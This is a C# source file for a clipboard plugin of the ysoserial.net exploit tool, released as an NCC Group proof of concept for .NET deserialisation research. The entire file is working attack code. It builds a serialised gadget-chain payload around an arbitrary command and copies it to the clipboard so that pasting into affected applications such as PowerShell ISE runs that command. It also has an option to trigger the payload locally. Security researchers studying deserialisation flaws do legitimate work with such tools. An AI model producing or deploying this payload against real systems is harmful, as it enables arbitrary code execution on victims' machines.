using System.Collections.Generic;
using NDesk.Options;
using System;
using ysoserial.Generators;
using System.IO;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Windows.Forms;
using System.Threading;
using ysoserial.Helpers;

/**
 * Author: Soroush Dalili (@irsdl) from NCC Group (@NCCGroupInfosec)
 * 
 * Comments: 
 *  This was released as a PoC for NCC Group's research on `Use of Deserialisation in .NET Framework Methods` (December 2018)
 *  See `DataObject.SetData Method`: https://docs.microsoft.com/en-us/dotnet/api/system.windows.forms.dataobject.setdata 
 *  Security note was added after being reported: https://github.com/dotnet/dotnet-api-docs/pull/502
 *  It was possible to copy other objects into the clipboard but this plugin only utilises one method that is used in the DataSetMarshal class
 *  The object will be copied to the clipboard and can be pasted into other affected applications such as Windows PowerShell ISE
 *  This PoC produces an error and may crash the application
 **/

namespace ysoserial.Plugins
{
    public class ClipboardPlugin : IPlugin
    {
        static string format = System.Windows.Forms.DataFormats.Serializable;
        static string command = "";
        static bool test = false;
        static bool minify = false;
        static bool useSimpleType = true;

        static OptionSet options = new OptionSet()
            {
                {"F|format=", "the object format: Csv, DeviceIndependentBitmap, DataInterchangeFormat, PenData, RiffAudio, WindowsForms10PersistentObject, System.String, SymbolicLink, TaggedImageFileFormat, WaveAudio. Default: WindowsForms10PersistentObject (the only one that works in Feb 2020 as a result of an incomplete silent patch - - will not be useful to target text based fields anymore)", v => format = v },
                {"c|command=", "the command to be executed", v => command = v },
                {"t|test", "whether to run payload locally. Default: false", v => test =  v != null },
                {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null },
                {"ust|usesimpletype", "This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true", v => useSimpleType =  v != null },
            };

        public string Name()
        {
            return "Clipboard";
        }

        public string Description()
        {
            return "Generates payload for DataObject and copy it into the clipboard - ready to be pasted in affected apps";
        }

        public string Credit()
        {
            return "Soroush Dalili";
        }


        public OptionSet Options()
        {
            return options;
        }

        public object Run(string[] args)
        {
            // to solve this error: Current thread must be set to single thread apartment (STA) mode before OLE calls can be made
            // we cannot use the [STAThread] outside of this plugin
            // here is a solution
            var staThread = new Thread(delegate ()
            {
                InputArgs inputArgs = new InputArgs();
                List<string> extra;
                try
                {
                    extra = options.Parse(args);
                    inputArgs.Cmd = command;
                    inputArgs.Minify = minify;
                    inputArgs.UseSimpleType = useSimpleType;
                    inputArgs.Test = test;
                }
                catch (OptionException e)
                {
                    Console.Write("ysoserial: ");
                    Console.WriteLine(e.Message);
                    Console.WriteLine("Try 'ysoserial -p " + Name() + " --help' for more information.");
                    System.Environment.Exit(-1);
                }

                object payload = "";
                if (String.IsNullOrEmpty(command) || String.IsNullOrWhiteSpace(command))
                {
                    Console.Write("ysoserial: ");
                    Console.WriteLine("Incorrect plugin mode/arguments combination");
                    Console.WriteLine("Try 'ysoserial -p " + Name() + " --help' for more information.");
                    System.Environment.Exit(-1);
                }

                // Creates a new data object.
                System.Windows.Forms.DataObject myDataObject = new System.Windows.Forms.DataObject();

                myDataObject.SetData(format, false, new AxHostStateMarshal(TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(inputArgs))); // for System.Windows.Forms

                /*
                myDataObject.SetData(format, new DataSetMarshal(TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(inputArgs)), false); // for System.Windows
                */

                Clipboard.Clear();
                Clipboard.SetDataObject(myDataObject, true);

                if (test)
                {
                    // PoC on how it works in practice
                    try
                    {
                        IDataObject dataObj = Clipboard.GetDataObject();
                        Object test = dataObj.GetData(format);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
            });
            staThread.SetApartmentState(ApartmentState.STA);
            staThread.Start();
            staThread.Join();

            return "Object copied to the clipboard";
        }
    }
}
